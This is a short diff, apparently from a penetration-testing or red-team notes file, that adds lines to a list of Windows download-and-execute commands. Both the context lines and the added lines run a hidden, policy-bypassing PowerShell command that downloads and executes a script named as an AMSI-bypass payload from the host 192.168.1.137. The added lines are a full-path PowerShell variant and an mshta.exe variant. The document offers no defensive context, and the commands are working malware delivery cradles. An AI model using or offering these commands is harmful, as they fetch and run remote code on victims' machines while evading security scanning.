@@ -27,6 +27,9 @@ Test-NetConnection 192.168.1.137 -Port 443
 
 powershell.exe -w hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.137/payload_bypass_amsi.ps1')"
 
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.137/payload_bypass_amsi.ps1')"
+
+mshta.exe http://192.168.1.137/payload_bypass_amsi.ps1
 
 
 
